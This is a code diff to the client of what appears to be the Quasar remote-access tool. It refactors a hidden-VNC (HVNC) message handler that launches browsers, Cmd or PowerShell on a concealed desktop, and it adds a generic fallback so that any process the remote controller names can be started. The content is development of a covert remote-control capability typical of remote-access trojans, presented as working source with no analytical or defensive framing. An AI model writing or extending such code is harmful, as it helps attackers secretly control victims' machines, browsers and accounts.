@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Concurrent;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Imaging;
@@ -265,46 +266,26 @@ namespace Quasar.Client.Messages
         private void Execute(ISender client, StartHVNCProcess message)
         {
             string name = message.Application;
-            if (name == "Chrome")
+            var processActions = new Dictionary<string, Action>
             {
-                this.ProcessHandler.Startchrome();
-                return;
-            }
-            if (name == "Explorer")
+                { "Chrome", ProcessHandler.Startchrome },
+                { "Explorer", ProcessHandler.StartExplorer },
+                { "Cmd", ProcessHandler.StartCmd },
+                { "Powershell", ProcessHandler.StartPowershell },
+                { "Edge", ProcessHandler.StartEdge },
+                { "Brave", ProcessHandler.StartBrave },
+                { "Opera", ProcessHandler.StartOpera },
+                { "Mozilla", ProcessHandler.StartFirefox }
+            };
+
+            if (processActions.TryGetValue(name, out var action))
             {
-                this.ProcessHandler.StartExplorer();
-                return;
+                action();
             }
-            if (name == "Cmd")
+            else
             {
-                this.ProcessHandler.StartCmd();
-                return;
+                ProcessHandler.StartGeneric(name);
             }
-            if (name == "Powershell")
-            {
-                this.ProcessHandler.StartPowershell();
-                return;
-            }
-            if (name == "Edge")
-            {
-                this.ProcessHandler.StartEdge();
-                return;
-            }
-            if (name == "Brave")
-            {
-                this.ProcessHandler.StartBrave();
-                return;
-            }
-            if (name == "Opera")
-            {
-                this.ProcessHandler.StartOpera();
-                return;
-            }
-            if (!(name == "Mozilla"))
-            {
-                return;
-            }
-            this.ProcessHandler.StartFirefox();
         }
 
         public void Dispose()
